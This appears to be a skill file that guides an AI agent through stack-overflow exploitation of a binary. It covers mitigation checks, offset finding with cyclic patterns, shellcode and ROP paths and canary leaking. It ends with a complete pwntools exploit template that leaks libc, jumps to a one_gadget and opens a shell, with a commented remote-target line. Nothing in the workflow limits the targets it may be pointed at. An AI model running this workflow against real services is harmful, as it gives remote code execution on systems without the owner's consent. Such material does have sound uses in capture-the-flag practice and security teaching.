# Stack Overflow Exploit Guide

## Trigger
Use this workflow when the user asks to analyze a stack overflow vulnerability in a binary.

## Phase 1: Reconnaissance
```
1. pwn_env()                          - Check toolchain completeness
2. inspect_binary(path=<binary>)      - Check mitigations (NX/Canary/PIE/RELRO)
3. inspect_binary(path=<binary>)      - Check architecture (ELF 32/64)
```

## Phase 2: Offset Calculation
```
1. pwn_cyclic(action="gen", length=200)    - Generate a de Bruijn sequence
2. pwn_debug(binary=<binary>,              - Feed the sequence and read the crash offset
     script="cyclic 200\nr\ninfo registers eip/rip")
3. pwn_cyclic(action="find", value=<crash_val>)  - Calculate the exact offset
```

## Phase 3: Weaponization

### Path A: NX Disabled -> Direct Shellcode
```python
from pwn import *
context.binary = elf = ELF("./binary")
shellcode = asm(shellcraft.sh())
payload = b"A" * offset + p64(stack_addr) + shellcode
```

### Path B: NX Enabled -> ROP Chain
```
1. pwn_rop(path=<binary>)                - Scan gadgets
2. pwn_libc(path=<binary>)               - Find libc version when leaked/available
3. pwn_one_gadget(libc_path=<libc>)      - Find one_gadget offsets
```

### Path C: Canary Present -> Leak Canary
```
1. Leak the canary first with a format string or partial overwrite.
2. Then execute the ROP chain.
```

## Phase 4: Exploit Script Template

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./BINARY")
context.log_level = "info"

# Remote target example:
# io = remote("host", port)
io = elf.process()

offset = OFFSET_HERE  # Result from Phase 2

# ROP chain
rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])  # Leak libc
rop.call("main")                      # Return to main for second overflow

payload = b"A" * offset + rop.chain()
io.sendlineafter(b"> ", payload)

# Parse leaked address
leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
log.success(f"puts@libc: {hex(leaked)}")

# Calculate libc base + one_gadget
libc = ELF("./libc.so.6")
libc.address = leaked - libc.symbols["puts"]
one_gadget = libc.address + 0xONE_GADGET_OFFSET

# Second overflow
io.sendlineafter(b"> ", b"A" * offset + p64(one_gadget))
io.interactive()
```

## Key Rules
- **Never guess offsets**; confirm them with pwn_cyclic + pwn_debug.
- **When NX is disabled**, direct shellcode is usually simpler than ROP.
- **When a canary is present**, leak it before overflowing.
- Run all exploit scripts with `run_code(use_venv=true, install_deps='pwntools')`.
